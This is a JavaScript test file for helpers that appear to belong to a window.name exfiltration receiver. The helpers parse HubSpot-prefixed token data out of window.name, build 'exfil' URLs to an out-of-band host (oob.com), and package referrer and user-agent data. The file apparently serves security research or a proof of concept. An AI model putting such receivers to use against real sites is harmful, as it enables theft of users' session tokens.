const {
  HUBSPOT_DATA_PREFIX,
  parseWindowName,
  buildExfilUrls,
  buildPostBody,
} = require('../lib/receiver-utils');

describe('receiver-utils', () => {
  // ── parseWindowName ───────────────────────────────────────
  describe('parseWindowName', () => {
    it('returns basic info for a plain string', () => {
      const result = parseWindowName('hello');
      expect(result.raw).toBe('hello');
      expect(result.length).toBe(5);
      expect(result.isHubspotData).toBe(false);
      expect(result.extracted).toBeNull();
      expect(result.parsed).toBeNull();
    });

    it('handles empty string', () => {
      const result = parseWindowName('');
      expect(result.raw).toBe('');
      expect(result.length).toBe(0);
      expect(result.isHubspotData).toBe(false);
    });

    it('handles null/undefined', () => {
      const result = parseWindowName(null);
      expect(result.raw).toBe('');
      expect(result.length).toBe(0);
    });

    it('extracts data when prefixed with HUBSPOT_DATA:', () => {
      const json = JSON.stringify({ token: 'abc', portalId: 123 });
      const result = parseWindowName(HUBSPOT_DATA_PREFIX + json);
      expect(result.isHubspotData).toBe(true);
      expect(result.extracted).toBe(json);
      expect(result.parsed).toEqual({ token: 'abc', portalId: 123 });
      expect(result.parseError).toBeNull();
    });

    it('sets parseError when JSON is invalid', () => {
      const result = parseWindowName(HUBSPOT_DATA_PREFIX + 'not-json');
      expect(result.isHubspotData).toBe(true);
      expect(result.extracted).toBe('not-json');
      expect(result.parsed).toBeNull();
      expect(result.parseError).toBeDefined();
    });

    it('handles HUBSPOT_DATA: with empty payload', () => {
      const result = parseWindowName(HUBSPOT_DATA_PREFIX);
      expect(result.isHubspotData).toBe(true);
      expect(result.extracted).toBe('');
    });
  });

  // ── buildExfilUrls ────────────────────────────────────────
  describe('buildExfilUrls', () => {
    it('builds correct URL set', () => {
      const urls = buildExfilUrls('https://oob.com', 'some-name', 'https://ref.com');
      expect(urls.name).toBe('https://oob.com/?name=some-name');
      expect(urls.ref).toBe('https://oob.com/?ref=https%3A%2F%2Fref.com');
      expect(urls.len).toBe('https://oob.com/?len=9');
    });

    it('URI-encodes special characters in name', () => {
      const urls = buildExfilUrls('https://oob.com', 'a b&c=d', '');
      expect(urls.name).toBe('https://oob.com/?name=a%20b%26c%3Dd');
    });

    it('handles empty inputs', () => {
      const urls = buildExfilUrls('https://oob.com', '', '');
      expect(urls.name).toBe('https://oob.com/?name=');
      expect(urls.len).toBe('https://oob.com/?len=0');
    });
  });

  // ── buildPostBody ─────────────────────────────────────────
  describe('buildPostBody', () => {
    it('includes all required fields', () => {
      const body = buildPostBody(
        'window-name',
        'https://ref.com',
        'TestAgent/1.0',
        '2024-01-01T00:00:00.000Z'
      );
      expect(body).toEqual({
        name: 'window-name',
        referrer: 'https://ref.com',
        timestamp: '2024-01-01T00:00:00.000Z',
        userAgent: 'TestAgent/1.0',
      });
    });

    it('generates a timestamp when not provided', () => {
      const body = buildPostBody('n', 'r', 'ua');
      expect(body.timestamp).toBeDefined();
      expect(body.timestamp).toMatch(/^\d{4}-\d{2}-\d{2}T/);
    });
  });
});
